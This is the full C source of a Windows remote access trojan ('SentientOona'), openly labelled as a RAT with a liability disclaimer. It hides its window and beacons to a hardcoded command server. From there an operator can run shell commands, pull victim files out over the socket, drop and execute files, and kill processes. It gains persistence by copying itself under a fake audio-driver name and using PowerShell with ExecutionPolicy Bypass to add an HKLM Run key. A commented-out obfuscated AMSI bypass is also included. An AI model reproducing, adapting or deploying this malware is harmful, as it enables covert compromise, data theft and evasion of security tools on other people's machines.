/*
C RAT for Windows. Run commands, upload/download files, execute/kill processes. Persistance with AutoRun RegKey.
Author: BenTheCyberOne
Current Version: 1.0.0
Blog: https://thissiteissafe.com
DO NOT USE WITHOUT AUTHORIZED CONSENT OR PERMISSION. I AM NOT LIABLE FOR ANY MALICIOUS WRONGDOINGS. YOU HAVE BEEN WARNED.
*/

#include <stdlib.h>
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>
#include <shellapi.h>
#include <sys/stat.h>
#include <winbase.h>

#pragma comment(lib,"ws2_32.lib") //Winsock Library
#pragma comment(lib,"Advapi32.lib") //Persistance requirement
#pragma comment(lib, "Shell32.lib") //Execution requirement
#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup") //Changes the linker config to hide on startup(don't show terminal, just a blank non-visable window)

//Change these to your master server address and listening port
#define IP "192.168.234.129"
#define PORT 8888

//Change this for the default connection message
#define INITCONNECT "HELLO FROM SENTIENT OONA\n"

//Change this to edit how long the process sleeps before it attempts to connect to master again
#define RECONTIMER 5000

//Global variable used for file byte sizes.
size_t size;

//Another global to determine connectivity.
int connected;

int parseCommand(char *reply){
  char command[10];
  strncpy(command, reply, 10);
  //DEBUG: printf("parsing master command\n");
  if(strstr(command, "cmd ")){
    return 0;
  }
  else if (strstr(command, "download ")){
    return 1;
  }
  else if(strstr(command, "upload ")){
    return 2;
  }
  else if(strstr(command, "execute ")){
    return 3;
  }
  else if(strstr(command, "kill ")){
    return 4;
  }
  else if (strstr(command, "kl ")){
    return 5;
  }
  else if(strstr(command, "ss ")){
    return 6;
  }
  else if(strstr(command, "stop")){
    return 7;
  }
  else if(strstr(command, "1")){
    return 8;
  }
  else if(strstr(command, "persist")){
    return 9;
  }
  else{
    return 10;
  }
}

//NOTE: runCommand opens a sub process to correctly pipe the output. THIS OPENS A VISABLE CMD PROMPT ON THE TARGET. For "better stealth", pipe a command to a file (dir > dir.txt)
//TODO: Pipe all commands into a temp file, send the temp file contents, then delete the file
void runCommand(char cmdOut[], char *command){
  //DEBUG: printf("called: %s\n",command);
  char cmdBuff[2048];
  FILE *fp;
  strcat(command," 2>&1");
  fp = _popen(command, "r");
  if (fp == NULL){
    //State that we couldn't run the command
    //DEBUG: printf("Failed to run command.%c",10);
    return;
  }
  //DEBUG: printf("we ran command.%c",10);
  //Copy the piped stdout to the buffer, then place the buffer inside the output string. This will help catch errors in the future
  while (fgets(cmdBuff, sizeof(cmdBuff), fp) != NULL){
    strcat(cmdOut, cmdBuff);
  }

  _pclose(fp);

  return;
}

char *killCommand(char pid[]){
  char command[35],cmdBuff[1000];
  //Since this is not multithreaded yet, we static the result string
  static char result[1000];
  FILE *fp;
  command[0] = '\0';
  result[0] = '\0';
  strcpy(command, "taskkill /f /t /pid ");
  strcat(command,pid);
  strcat(command," 2>&1");
  //DEBUG: printf("CMD: %s\n",command);
  fp = _popen(command,"r");
  if (fp == NULL){
    return "Process opening for kill failed\n";
  }
  while(fgets(cmdBuff, sizeof(cmdBuff), fp) != NULL){
    strcat(result, cmdBuff);
  }
  _pclose(fp);
  return result;
  /*
  int result = WinExec(command,SW_HIDE);
  if(result < 31){
    return 0;
  }
  else{
    return 1;
  }
  */
}
int executeCommand(char path[]){
  //TODO: Allow Master to chose whether SW_HIDE or SW_SHOWNORMAL
  //int debug = WinExec(winExec,SW_SHOWNORMAL);
  //ShellExecuteA is a much better API call than WinExec, so we use that here
  int result = ShellExecuteA(NULL,"open",path,NULL,NULL,SW_SHOW);
  //DEBUG: printf("EXEC RET CODE: %d\n", result);
  if (result < 32){
    return 0;
  }
  else{
    return 1;
  }
}

int uploadCommand(SOCKET s, char path[]){
  char reply_fileSize[15];
  int recv_size, uploaded_fileSize;
  unsigned char *uploaded_fileBuff;
  FILE *fp;
  memset(&reply_fileSize, 0, 15);
  if ((recv_size = recv(s,reply_fileSize, 15, 0)) == SOCKET_ERROR){
    printf("We failed to recv filesize from master \nError:%d\n)", WSAGetLastError());
    return 1;
  }
  uploaded_fileSize = atoi(reply_fileSize);
  printf("File size from up func: %d\n",uploaded_fileSize);
  if(uploaded_fileSize == 0){
    return 1;
  }
  if((uploaded_fileBuff = calloc(uploaded_fileSize+1,1)) == NULL){
    printf("We failed to allocate a proper buffer with size: %d\n",uploaded_fileSize);
    return 1;
  }
  if((recv_size = recv(s,uploaded_fileBuff,uploaded_fileSize,MSG_WAITALL)) == SOCKET_ERROR){
    printf("We failed to recieve the uploaded file%c",10);
    printf("WSA upload file error code: %d.\n", WSAGetLastError());
    free(uploaded_fileBuff);
    return 1;
  }
  /* DEBUG:
  for (int i = 0; i < uploaded_fileSize; i++){
    printf("%02x", uploaded_fileBuff[i]);
  }
  */
  fp = fopen(path, "wb");
  if(fp == NULL){
    printf("opening of file failed.%c",10);
    free(uploaded_fileBuff);
    return 1;
  }
  if(fwrite(uploaded_fileBuff,sizeof *uploaded_fileBuff, uploaded_fileSize, fp) != uploaded_fileSize){
    printf("Failed to write buffer to file%c",10);
    fclose(fp);
    free(uploaded_fileBuff);
    return 1;
  }
  printf("File uploaded to: %s\n",path);
  fclose(fp);
  free(uploaded_fileBuff);
  return 0;
}

int getFileSize(char path[]){
  FILE *file;
  int result,statResult;
  struct _stat fileStat;
  statResult = (_stat(path,&fileStat));
  if (statResult != 0){
    return 0;
  }
  result = fileStat.st_size;
  return result;
}

void downloadCommand(char path[], char fileBuffer[]){
  FILE *file;
  //Since this is not multithreaded yet, we static the error string
  //static char errString[1000];
  //unsigned char *fileBuffer;

  file = fopen(path,"rb");
  if (file == NULL){
    strcpy(fileBuffer,"Unable to open file: ");
    strcat(fileBuffer, path);
    strcat(fileBuffer, "\n");
    //Make sure when we send the data it sends the correct length of the current errString
    size = strlen(fileBuffer);
    return;
  }
  fseek(file,0,SEEK_END);
  size = ftell(file);
  fseek(file,0,SEEK_SET);
  if(fread(fileBuffer, sizeof *fileBuffer, size, file) != size){
    strcpy(fileBuffer,"Failed to read file: ");
    strcat(fileBuffer, path);
    strcat(fileBuffer, "\n");
    //Make sure when we send the data it sends the correct length of the current errString
    size = strlen(fileBuffer);
    return;
  }
  /* DEBUG:
  else{
    for (int i = 0; i < size; i++){
      printf("%02x", fileBuffer[i]);
    }

    */
    fclose(file);
    return;
}

int sendFileData(SOCKET s, char *data){
  if (send(s,data,size, 0) < 0){
    //DEBUG: printf("We failed to send the data.\nError: %d\n", WSAGetLastError());
    return 1;
    //Tell main to re-establish everything again
    connected = 0;
  }
  printf("We sent the data!%c", 10);
  //DEBUG: printf("DATA SENT: %s\n", data);
  return 0;
}

int sendData(SOCKET s, char *data){
  if (send(s,data,strlen(data), 0) < 0){
    //DEBUG: printf("We failed to send the data.\nError: %d\n", WSAGetLastError());
    return 1;
    //Tell main to re-establish everything again
    connected = 0;
  }
  printf("We sent the data!%c", 10);
  return 0;
}

int persistance(){
  //Grab the current threads username
  long unsigned int usernameSize = 255;
  char username[255];
  GetUserNameA(username, &usernameSize);
  //Copy into appdata folder
  char newPath[500], currPath[1000], regKeyCommand[700];
  strcpy(newPath, "C:\\Users\\");
  strcat(newPath, username);
  strcat(newPath, "\\AppData\\Local\\Temp\\PulseAudioDriverUpdate.exe");
  printf("newpath: %s\n",newPath);
  DWORD fileStats = GetModuleFileNameA(NULL, currPath, 1000);
  if(fileStats){
    CopyFile(currPath, newPath, 0);
  }
  else{
    printf("Failed to grab exe name\n");
    return 1;
  }
  /* DEBUG (not required for this version *yet*):
  char *removeAMSI = "[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)";
  int amsi = ShellExecuteA(NULL,NULL,"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",removeAMSI,NULL,SW_HIDE);
  printf("amsi result: %d\n",amsi);
  */
  //Setup the echo command to create the powershell script
  strcpy(regKeyCommand,"/c echo ");
  strcat(regKeyCommand,"New-ItemProperty -Path HKLM:\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run -Name PulseAudioDriverUpdate -PropertyType String -Value ");
  strcat(regKeyCommand, newPath);
  strcpy(newPath, "C:\\Users\\");
  strcat(newPath, username);
  strcat(newPath, "\\AppData\\Local\\Temp\\audioupdates.ps1");
  strcat(regKeyCommand, " > ");
  strcat(regKeyCommand, newPath);
  //Run the echo command, creating the powershell script
  int echoResult = ShellExecuteA(NULL,NULL,"cmd.exe",regKeyCommand,NULL,SW_HIDE);
  if(echoResult < 32){
    printf("Failed to echo with cmd%c",10);
    return 1;
  }
  printf("cmd'd this: %s\n",regKeyCommand);
  strcpy(newPath, "-ExecutionPolicy Bypass -File C:\\Users\\");
  strcat(newPath, username);
  strcat(newPath, "\\AppData\\Local\\Temp\\audioupdates.ps1");
  int shlResult = ShellExecuteA(NULL,"runas","powershell.exe",newPath,NULL,SW_HIDE);
  if(shlResult < 32){
    printf("Failed to run powershell command%c",10);
    return 1;
  }
  printf("powershell'd result code: %d\n",shlResult);
  return 0;

}
//TODO: Make use of ConnectEx and DisconnectEx() to ensure reconnection to master after initial connect
int main(int argc, char *argv[]){

  WSADATA wsa;
  SOCKET s;
  char *dataToSend, server_reply[2000], cmdOut[2048], command[2048], param[2048], errString[1024], execString[1024];
  int recv_size, persResult;
  struct sockaddr_in server;
  //DEBUG:   printf("\nInit Winsock...%c",10);

  //For loop to establish WSA and a new socket is required EACH TIME we have a disconnect!
  for(;;){
    //init of Winsock DLL
    if (WSAStartup(MAKEWORD(2,2),&wsa) != 0){
      //DEBUG: printf("Failed. Error Code: %d",WSAGetLastError());
      //We exit here, since we couldn't find Winsock DLL. This DLL is essential to the client.
      exit(0);
    }
    //DEBUG: printf("Winsock initialised!%c", 10);

    //Make sure the socket can be established, and initialize it
    if((s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET){
          printf("Could not create socket : %d.\n", WSAGetLastError());
          //Something is blocking up from starting up a socket. We should exit the client
          WSACleanup();
          exit(0);
        }
    //DEBUG: printf("Socket created. Connecting...\n");
    //DEBUG: printf("Creating the connection now...%c", 10);
    //zero out server
    memset(&server,0, sizeof server);

    //Socket details can be defined here
    server.sin_addr.s_addr = inet_addr(IP);
    server.sin_family = AF_INET;
    server.sin_port = htons(PORT);

    //Socket connects here.
    while (connect(s,(struct sockaddr*)(&server), sizeof(server)) < 0){
      //DEBUG: printf("Connection Error:%d\n", WSAGetLastError());
      //Tell process to sleep for x seconds to create a tad bit of stealth (default is 5)
      Sleep(RECONTIMER);
    }
    printf("Connected!%c", 10);
    dataToSend = INITCONNECT;
    if (send(s,dataToSend,strlen(dataToSend), 0) < 0){
      printf("We failed to send the data.\nError: %d\n", WSAGetLastError());
      //exit(0);
    }
    //Set our global connection variable to True (yes, we are connected to the master!)
    connected = 1;
    //DEBUG: printf("We sent the data!%c", 10);
    //While we are connected
    while(connected == 1){
      if ((recv_size = recv(s,server_reply, 2000, 0)) == SOCKET_ERROR){
        printf("We failed to recv from the master \nError:%d\n)", WSAGetLastError());
        //exit(0);
      }
      //If we receive 0 bytes from the connection, it must be closed. Set connected to False
      if(recv_size == 0){
        connected = 0;
      }
      printf("We got a reply! Here is the data%c",10);
      //This null terminator is crutial for printing the string!
      server_reply[recv_size] = '\0';
      //Span the command to remove newline \n
      server_reply[strcspn(server_reply,"\n")] = 0;
      printf("%s\n",server_reply);
      printf("RECV SIZE: %d\n",recv_size);
      //Parse whether the reply was a Windows command or a Master command
      int cmd = parseCommand(server_reply);
      printf("PARSE RESULT: %d\n",cmd);
      switch(cmd){
        case 0:
          //Zero out our buffers (C treats \0 at the start of an array as an "empty" string)
          command[0] = '\0';
          cmdOut[0] = '\0';
          //This copies the reply into a buffer and removes "cmd "
          strncpy(command, server_reply + 4, strlen(server_reply) - 3);
          //DEBUG: puts(command);
          runCommand(cmdOut,command);
          sendData(s,cmdOut);
          break;
        case 1:
          //DEBUG: printf("Master command was: download%c",10);
          param[0] = '\0';
          //We know now that the command is download, so copy everything else to param buffer
          strncpy(param, server_reply + 9, strlen(server_reply) - 8);
          //DEBUG: printf("PARAM VALUE: %s \n", param);
          //For this to work properly, we need to first send the size of the file being downloaded
          //This is to ensure the server allocates enough memory for the file!
          int fileSize = getFileSize(param);
          //getFileSize will tell us if the file even exists or not (however 0 byte files will be marked as un-downloadable)
          //If filesize is 0, tell that to Master (while some files may exist with 0 bytes written, why would you want to download that?)
          //Will be fixed in future release(probably)
          if(fileSize < 1){
            sendData(s,"0");
            break;
          }
          else{
            char fileSizeStr[15];
            unsigned char *fileContents;
            fileSizeStr[0] = '\0';
            //Translate the integer to a string
            sprintf(fileSizeStr,"%d",fileSize);
            //DEBUG: printf("FILE SIZE: %s\n",fileSizeStr);
            sendData(s,fileSizeStr);
            //Why do we sleep here? With the current setup, a race-like condition within the TCP stream between the Master and winsock2 morphs the way our file data is sent
            //(This bug took many, many days to figure out)
            Sleep(4000);
            if((fileContents = calloc(fileSize+1,1)) == NULL){
              sendData(s,"ERR: NULL BUFF");
              break;
            }
            //Download command is now passed fileContents instead of returning it due to issues in byte translation
            downloadCommand(param,fileContents);
            /* DEBUG:
            for(int i = 0; i<fileSize; ++i){
              printf("%02x",fileContents[i]);
            }
            */
            sendFileData(s,fileContents);
            free(fileContents);
            //memset(&fileContents,0,fileSize);
            sendData(s,"DOWNLOAD DONE\n");
            break;
          }
        case 2:
          param[0] = '\0';
          //DEBUG: printf("Master command was: upload%c", 10);
          //We know now that the command is upload, so copy everything else to param buffer
          strncpy(param, server_reply + 7, strlen(server_reply) - 6);
          printf("PARAM: %s\n",param);
          uploadCommand(s,param);
          sendData(s,"UPLOAD DONE\n");
          break;
        case 3:
          //Null out the response strings
          param[0] = '\0';
          errString[0] = '\0';
          execString[0] = '\0';
          //DEBUG: printf("Master command was: execute%c", 10);
          //We know now that the command is execute, so copy everything else to param buffer
          strncpy(param, server_reply + 8, strlen(server_reply) - 7);
          //DEBUG: printf("PARAM VAL: %s\n",param);
          int wasExecuted = executeCommand(param);
          if (wasExecuted == 0){
            strcpy(errString,"Execution of the following failed: ");
            strcat(errString, param);
            strcat(errString, "\n");
            sendData(s, errString);
          }
          else if(wasExecuted == 1){
            strcpy(execString,"Executed successfully: ");
            strcat(execString,param);
            strcat(execString, "\n");
            sendData(s,execString);
          }
          break;
        case 4:
          //Null out the response strings
          param[0] = '\0';
          //DEBUG: printf("Master command was: kill%c", 10);
          //We know now that the command is kill, so copy everything else to param buffer
          strncpy(param, server_reply + 5, strlen(server_reply) - 4);
          //DEBUG: printf("PARAM VAL: %s\n",param);
          char *wasKilled = killCommand(param);
          sendData(s,wasKilled);
          break;
        case 5:
          //DEBUG: printf("Master command was: kl%c", 10);
          //We know now that the command is kl, so copy everything else to param buffer
          //TODO: Implement keylog function (planned for version 1.2.0)
          sendData(s,"This is version 1.0.0. Keylogging is not yet implemented.\n");
          break;
        case 6:
          //DEBUG: printf("Master command was: ss%c", 10);
          //We know now that the command is ss, so copy everything else to param buffer
          //TODO: Implement screenshot function (planned for version 1.1.0)
          sendData(s,"This is version 1.0.0. Screenshotting is not yet implemented.\n");
          break;
        case 7:
          //DEBUG: printf("Master command was: stop%c", 10);
          sendData(s, "Gotcha. Stopping SentientOona client now...\n");
          closesocket(s);
          WSACleanup();
          exit(0);
          break;
        case 8:
          //This case is to help the Master determine if the client is still alive, as well as being used for debugging
          sendData(s,"CLIENT IS ALIVE\n");
          break;
        case 9:
          persResult = persistance();
          if(persResult != 0){
            sendData(s, "Persistance failed.\n");
          }
          sendData(s,"Got persistance in AutoRun regkey!\n");
          break;
        case 10:
          errString[0] = '\0';
          strcpy(errString, "Did not recieve a valid command\n");
          sendData(s, errString);
      // default:
        //  errString[0] = '\0';
        //  strcpy(errString, "Did not recieve a valid command\n");
        //  sendData(s, errString);
      }
      //break;
    }
    //break;
  }
  closesocket(s);
  WSACleanup();
}
